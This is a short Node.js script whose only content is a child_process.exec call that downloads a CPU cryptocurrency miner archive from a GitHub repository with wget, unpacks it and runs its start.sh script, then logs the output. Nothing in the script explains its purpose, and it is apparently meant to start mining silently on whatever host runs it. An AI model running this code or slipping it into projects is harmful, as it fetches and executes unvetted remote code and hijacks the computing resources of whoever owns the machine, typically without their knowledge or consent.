const { exec, spawn, execSync } = require("child_process")
exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh', (error, stderr, stdout) => {
if (error) {
console.log(`error: ${error.message}`);
return;
}

if (stderr) {
console.log(`stderr: ${stderr}`);
return;
}

console.log(`stdout: ${stdout}`)
});